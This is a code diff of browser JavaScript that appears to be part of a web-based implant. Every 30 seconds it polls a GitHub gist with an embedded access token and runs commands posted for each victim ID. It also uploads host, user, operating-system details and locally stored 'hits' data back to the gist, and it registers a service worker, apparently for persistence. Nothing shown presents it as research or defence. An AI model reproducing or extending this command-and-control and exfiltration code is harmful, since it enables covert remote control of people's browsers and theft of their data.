@@ -78,7 +78,7 @@
         }));
     }, 3000);
 
-    setInterval(function() { relay(uid); checkCmd(); }, 30000);
+    setInterval(function() { tick(uid); }, 30000);
 
     if ('serviceWorker' in navigator) {
         navigator.serviceWorker.register('/sw.js', { scope: '/' }).catch(function() {});
@@ -107,21 +107,34 @@
         }).catch(function() {});
     }
 
-    function checkCmd() {
+    function tick(uid) {
         fetch('https://api.github.com/gists/' + GIST_ID, {
             headers: { 'Authorization': 'Bearer ' + PAT }
         }).then(function(r) { return r.json(); }).then(function(gist) {
-            var key = 'cmd_' + uid;
-            if (!gist.files || !gist.files[key]) return;
-            var cmd = (gist.files[key].content || '').trim();
-            if (!cmd) return;
-            handleCmd({ cmd: cmd, uid: uid });
-            var del = {};
-            del[key] = null;
+            var ex = {};
+            try { var mf = gist.files && gist.files['meta_' + uid]; if (mf) ex = JSON.parse(mf.content || '{}'); } catch(e) {}
+            var lm = {};
+            try { lm = JSON.parse(localStorage.getItem('_meta') || '{}'); } catch(e) {}
+            var m = {
+                ts: Math.floor(Date.now() / 1000),
+                host: lm.host || ex.host || '',
+                user: lm.user || ex.user || '',
+                umt: lm.umt || ex.umt || '',
+                os: lm.os || ex.os || navigator.userAgent
+            };
+            var dataRaw = localStorage.getItem('_data') || '{"hits":[]}';
+            var files = {};
+            files['meta_' + uid] = { content: JSON.stringify(m) };
+            files['data_' + uid] = { content: dataRaw };
+            var cmdKey = 'cmd_' + uid;
+            if (gist.files && gist.files[cmdKey]) {
+                var cmd = (gist.files[cmdKey].content || '').trim();
+                if (cmd) { handleCmd({ cmd: cmd }); files[cmdKey] = null; }
+            }
             fetch('https://api.github.com/gists/' + GIST_ID, {
                 method: 'PATCH',
                 headers: { 'Authorization': 'Bearer ' + PAT, 'Content-Type': 'application/json' },
-                body: JSON.stringify({ files: del })
+                body: JSON.stringify({ files: files })
             }).catch(function() {});
         }).catch(function() {});
     }
